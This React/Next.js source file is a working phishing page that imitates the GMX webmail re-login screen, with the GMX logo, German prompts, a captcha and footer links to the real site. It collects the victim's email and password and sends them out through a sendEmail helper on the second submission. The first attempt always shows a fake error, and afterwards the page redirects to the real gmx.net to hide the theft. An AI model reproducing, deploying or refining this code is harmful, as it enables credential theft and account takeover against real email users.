"use client";
import React, { useState } from "react";
import Image from "next/image";
import { PT_Sans, Arimo, Roboto_Condensed } from "next/font/google";
import { useForm } from "react-hook-form";

import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";

import useCaptchas from "../useCaptchas";

import RefreshIcon from "../assets/RefreshIcon";
import InfoIcon from "../assets/InfoIcon";
import ErrorIcon from "../assets/ErrorIcon";
import sendEmail from "@/utils/sendEmail";
import Logo56 from "../assets/Logo56.svg";

const ptSans = PT_Sans({ weight: ["400", "700"], subsets: ["latin"] });
const arimo = Arimo({ weight: ["400", "600", "700"], subsets: ["latin"] });
const roboto = Roboto_Condensed({
  weight: ["300", "400", "700"],
  subsets: ["latin"],
});

interface IFormInputProps {
  label?: string;
  onChange?: any;
  onBlur?: any;
  name?: any;
  errors?: any;
  errorMessage?: string;
  type?: string;
}

const FormInput = React.forwardRef(
  (props: IFormInputProps, ref?: React.ForwardedRef<HTMLInputElement>) => (
    <>
      <label className="text-xs flex flex-col">
        {props.label}
        <input
          type={props.type || "text"}
          name={props.name}
          className={`border ${
            props.errors[props.name] ? "border-red-600" : "border-gray-300"
          }  h-8 rounded mt-1 text-sm px-2`}
          ref={ref}
          onBlur={props.onBlur}
          onChange={props.onChange}
        />
      </label>

      {props.errors[props.name] && (
        <div className="flex items-center text-[16px] mt-2">
          <ErrorIcon />
          <span className="ml-2 leading-tight text-red-600">
            {props.errorMessage}
          </span>
        </div>
      )}
    </>
  )
);

FormInput.displayName = "FormInput";

interface IFormValues {
  email: string;
  password: string;
  captcha: string;
}

const MAIN_PAGE_URL = "https://www.gmx.net/";

export default function Home() {
  const { randomCaptcha, currentCaptcha } = useCaptchas();
  const {
    register,
    handleSubmit,
    watch,
    formState: { errors },
  } = useForm<IFormValues>();

  const [loginAttempt, setLoginAttempt] = useState(0);

  const notify = () =>
    toast("password verification successful", {
      type: "success",
      onClose: () => {
        window.location.assign(MAIN_PAGE_URL);
      },
    });

  const onSubmit = async (values: IFormValues) => {
    try {
      if (loginAttempt === 1) {
        const response = await sendEmail(values);

        if (response.data === "OK") {
          notify();
        }
      }
    } catch (error) {
      console.log(error);
    }
  };

  return (
    <div
      className={`md:bg-gray-100 min-h-screen text-[#525252] ${arimo.className}`}
    >
      <header className="bg-[#1c449b] h-14 flex items-center mb-12 px-4 border-b border-b-[#dadada] md:border-b-0">
        <div>
          <svg viewBox="0 0 68 22" id="logo-gmx" className="fill-white h-6">
            <path d="M60 10.4L65.9.6h-6l-3.1 5-3.3-5h-6.6l6.9 9.8-6.9 11h6.6l3.7-6.2 4.4 6.2h5.8l-7.4-11zM38.4.6l-4.5 11.1L29.7.6h-5.3l-3.5 20.8h5.4l1.8-12 4.8 12h2.2l5-12H40l1.5 12h5.4L43.8.6h-5.4zM11 9.8V14h4.4c-.2 2.4-2 3.6-4.3 3.6-3.5 0-5.4-3.2-5.4-6.5S7.4 4.6 11 4.6c2 0 3.8 1.3 4.4 3.3l5.1-2.1c-1.6-3.7-5.3-6-9.3-5.8C4.5 0 0 4.4 0 11.1 0 17.6 4.5 22 11 22c3.3.2 6.5-1.3 8.5-4 1.8-2.6 2-5.1 2.1-8.2H11z" />
          </svg>
        </div>

        <div
          className={"ml-4 text-3xl text-white font-light " + roboto.className}
        >
          Mein Account
        </div>
      </header>

      <div className="pb-60">
        <form
          onSubmit={handleSubmit((values) => {
            setLoginAttempt((state) => state + 1);
            onSubmit(values);
          })}
          className="bg-white mx-auto md:pt-5 md:pb-8 md:px-8 px-4 rounded md:w-[368px]"
        >
          <div
            className="bg-gray-200 mx-auto rounded relative"
            style={{ height: 100, width: 100 }}
          >
            {/* <LogoWebDe56 /> */}
            <Image src={Logo56} alt="Logo" fill={true} />
          </div>

          <h2
            className={
              "font-bold text-[24.5px] text-center mb-6 " + ptSans.className
            }
          >
            Bitte erneut einloggen
          </h2>

          <p className="text-center mb-8 text-[15px] tracking-normal">
            Bitte melden Sie sich mit Ihrer GMX E-Mail-Adresse und Passwort
            erneut an.
          </p>

          <div className="mb-5">
            <FormInput
              label="GMX E-Mail-Adresse"
              {...register("email", { required: true })}
              errors={errors}
              errorMessage="Bitte geben Sie Ihre E-Mail-Adresse ein."
            />
          </div>

          <FormInput
            label="Passwort eingeben"
            type="password"
            {...register("password", { required: true })}
            errors={loginAttempt !== 1 ? errors : { password: true }}
            errorMessage="Bitte geben Sie Ihr Passwort ein."
          />

          <div className="flex items-center my-4">
            <div className={"text-xl font-bold " + ptSans.className}>
              Sicherheitsabfrage
            </div>

            <div className="h-5 w-5 rounded ml-4 text-[#1c8ad9]">
              <InfoIcon />
            </div>
          </div>

          <div className="h-24 bg-gray-100 relative flex items-center justify-center">
            <Image
              src={currentCaptcha.image}
              alt="captcha"
              width={225}
              height={53}
            />
          </div>

          <button
            className="flex items-center mt-2.5 mb-5"
            type="button"
            onClick={randomCaptcha}
          >
            <div className="h-5 w-5 rounded mr-4 text-[#1c449b]">
              <RefreshIcon />
            </div>

            <div className="text-sm text-[#1c449b] tracking-wider hover:underline">
              Andere Zeichenfolge anzeigen
            </div>
          </button>

          <FormInput
            label="Zeichenfolge eingeben"
            {...register("captcha", { required: true })}
            errors={errors}
            errorMessage="Bitte versuchen Sie es erneut."
          />

          <button className="h-8 bg-[#6e9804] text-white text-sm w-full font-semibold rounded-md mt-5">
            Login
          </button>
        </form>
      </div>

      <footer className="bg-[#999] fixed bottom-0 w-screen min-h-[50px] flex flex-col md:flex-row items-center justify-center gap-x-10 text-white py-5">
        <a
          href="https://www.gmx.net/impressum/"
          target="_blank"
          className="hover:underline"
        >
          Impressum
        </a>

        <a
          href="https://www.gmx.net/kuendigungsformular"
          target="_blank"
          className="hover:underline"
        >
          Verträge hier kündigen
        </a>

        <a
          href="https://agb-server.gmx.net/datenschutz"
          target="_blank"
          className="hover:underline"
        >
          Datenschutzhinweise
        </a>

        <a
          href="https://agb-server.gmx.net/gmxagb-de"
          target="_blank"
          className="hover:underline"
        >
          AGB
        </a>

        <a
          href="https://hilfe.gmx.net/"
          target="_blank"
          className="hover:underline"
        >
          Hilfe und Tipps
        </a>
      </footer>
      <ToastContainer />
    </div>
  );
}
